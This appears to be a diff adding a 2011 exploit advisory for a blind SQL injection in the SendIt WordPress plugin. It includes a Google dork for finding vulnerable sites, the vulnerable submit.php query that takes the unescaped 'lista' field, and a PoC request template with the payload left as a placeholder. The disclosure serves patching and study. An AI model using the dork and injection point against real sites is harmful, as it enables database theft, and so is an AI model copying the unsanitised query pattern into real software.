@@ -1,0 +1,40 @@
+# Exploit Title: WordPress SendIt plugin <= 1.5.9 Blind SQL Injection Vulnerability
+# Google Dork: inurl:"wp-content/plugins/sendit/submit.php"
+# Date: 2011-08-25
+# Author: evilsocket ( evilsocket [at] gmail [dot] com )
+# Software Link: http://wordpress.org/extend/plugins/sendit/
+# Version: 1.5.9 (tested with magic quotes OFF)
+
+
+---------------
+Vulnerable code
+---------------
+
+[ submit.php line 27 ]
+
+$user_count = $wpdb->get_var("SELECT COUNT(*) FROM $table_email where email ='$_POST[email_add]' and id_lista = '$_POST[lista]';");
+
+
+As you can see, $_POST[lista] parameter is nor validated neither escaped, so you can blind sql inject it using $user_count for the 
+boolean condition checking :
+
+
+[ submit.php line 29 ]
+
+if($user_count>0) :
+  $errore_presente = "<div class=\"error\">".__('email address already present', 'sendit')."</div>";
+  die($errore_presente);
+
+---
+PoC
+---
+
+POST:
+
+email_add = some.random.regexp.valid.email@domain.ltd
+lista = BLIND SQL INJECTION HERE
+
+TO:
+
+http://www.site.com/wp-content/plugins/sendit/submit.php
+
